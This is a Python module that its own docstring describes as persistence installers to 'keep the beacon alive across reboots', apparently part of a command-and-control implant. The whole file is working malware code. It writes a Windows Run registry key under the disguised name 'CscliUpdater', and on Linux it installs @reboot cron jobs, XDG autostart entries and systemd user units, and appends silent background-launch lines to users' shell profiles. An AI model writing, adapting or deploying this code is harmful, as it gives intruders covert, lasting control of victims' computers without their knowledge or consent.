"""Persistence installers -- keep the beacon alive across reboots.

Cross-platform, using only stdlib. On Linux this leverages user crontab/systemd
user units and shell profile hooks. On Windows it uses the Registry Run keys via
`winreg`. The exact mechanism is passed as a subcommand argument.
"""
import os
import shutil
import sys
import tempfile

# ---- shared helpers ----
def _which(name):
    return shutil.which(name)

def _is_windows():
    return os.name == "nt"

# ---------------------------------------------------------------------------
# Windows run keys (winreg)
# ---------------------------------------------------------------------------
_WIN_RUN_KEYS = [
    r"Software\Microsoft\Windows\CurrentVersion\Run",
]

def _install_win_reg(payload_path, name="CscliUpdater"):
    try:
        import winreg
    except Exception:
        return False, "winreg unavailable (not on Windows?)"
    cmdline = f'"{sys.executable}" "{payload_path}" --name {name}'
    for key in _WIN_RUN_KEYS:
        try:
            with winreg.OpenKey(winreg.HKEY_CURRENT_USER, key, 0,
                                winreg.KEY_SET_VALUE) as k:
                winreg.SetValueEx(k, name, 0, winreg.REG_SZ, cmdline)
            return True, f"HKCU {key}\\{name} = {cmdline}"
        except OSError as e:
            return False, f"HKLM/HKCU write failed: {e}"


# ---------------------------------------------------------------------------
# Linux cron / autostart / shell profile
# ---------------------------------------------------------------------------
def _install_linux_cron(payload_path, name="cscli"):
    cron_path = None
    crontab = _which("crontab")
    if crontab:
        cron_path = crontab
    # write a job into the user crontab
    job = f"@reboot {sys.executable} {payload_path} --name {name} >/dev/null 2>&1 &\n"
    try:
        if crontab:
            existing = subprocess_run(["crontab", "-l"])
            cur = existing if isinstance(existing, str) else ""
        else:
            cur = ""
        entries = [l for l in cur.splitlines() if "@reboot" in l and name in l]
        if cur and not cur.endswith("\n"):
            cur += "\n"
        new = cur + job
        subprocess_run(["crontab", "-"], stdin_data=new)
        return True, f"@reboot cron job '--name {name}' installed"
    except Exception as e:
        return False, f"cron failed: {e}"


def subprocess_run(args, stdin_data=None):
    import subprocess
    if stdin_data is not None:
        p = subprocess.run(args, input=stdin_data, capture_output=True, text=True)
        return p.stdout or ""
    p = subprocess.run(args, capture_output=True, text=True)
    return p.stdout or ""


def _install_linux_xdg(payload_path, name="cscli"):
    """~/.config/autostart/*.desktop for desktop sessions."""
    autostart = os.path.expanduser("~/.config/autostart")
    os.makedirs(autostart, exist_ok=True)
    desk = os.path.join(autostart, name + ".desktop")
    content = (
        "[Desktop Entry]\n"
        f"Name={name}\nExec={sys.executable} {payload_path} --name {name}\n"
        "Terminal=false\nType=Application\nX-GNOME-Autostart-enabled=true\n"
    )
    with open(desk, "w") as f:
        f.write(content)
    return True, f"desktop autostart written: {desk}"


def _install_linux_profiles(payload_path, name="cscli"):
    """Append a startup hook to the user's shell profile."""
    line = f"\n# cscli-persist {name}\n({sys.executable} {payload_path} --name {name} >/dev/null 2>&1 &)\n"
    written = []
    for rc in ("~/.bashrc", "~/.zshrc", "~/.profile", "~/.bash_profile"):
        p = os.path.expanduser(rc)
        if os.path.exists(p):
            with open(p, "a") as f:
                f.write(line)
            written.append(p)
    return bool(written), "; ".join(written) or "no profile files found"


_MECHANISMS = {
    "win-runkey": lambda p, n: _install_win_reg(p, n),
    "cron": lambda p, n: _install_linux_cron(p, n),
    "xdg-autostart": lambda p, n: _install_linux_xdg(p, n),
    "shell-profile": lambda p, n: _install_linux_profiles(p, n),
}


def install(mechanism, payload_path, name="cscli"):
    """Install persistence for `payload_path` under the requested mechanism.

    Returns (ok, message). The beacon is expected to already exist at
    payload_path (e.g. via a prior `upload`/download of itself)."""
    m = mechanism.lower().replace("-", "_")
    fn = _MECHANISMS.get(m) or _MECHANISMS.get(mechanism)

    if fn:
        return fn(payload_path, name)
    # convenience aliases
    if mechanism in ("registry", "runkey"):
        return _install_win_reg(payload_path, name)
    if mechanism in ("systemd",):
        return _install_linux_systemd(payload_path, name)
    return False, f"unknown persistence mechanism: {mechanism}. choose from {list(_MECHANISMS)}"


def _install_linux_systemd(payload_path, name="cscli"):
    unit_dir = os.path.expanduser("~/.config/systemd/user")
    os.makedirs(unit_dir, exist_ok=True)
    unit = f"[Unit]\nDescription={name} daemon\n\n[Service]\nExecStart={sys.executable} {payload_path} --name {name}\nRestart=on-failure\n\n[Install]\nWantedBy=default.target\n"
    path = os.path.join(unit_dir, name + ".service")
    with open(path, "w") as f:
        f.write(unit)
    subprocess_run(["systemctl", "--user", "daemon-reload"])
    subprocess_run(["systemctl", "--user", "enable", name + ".service"])
    return True, f"systemd user unit {path}"


def list_mechanisms():
    return sorted(list(_MECHANISMS) + ["registry", "runkey", "systemd"])
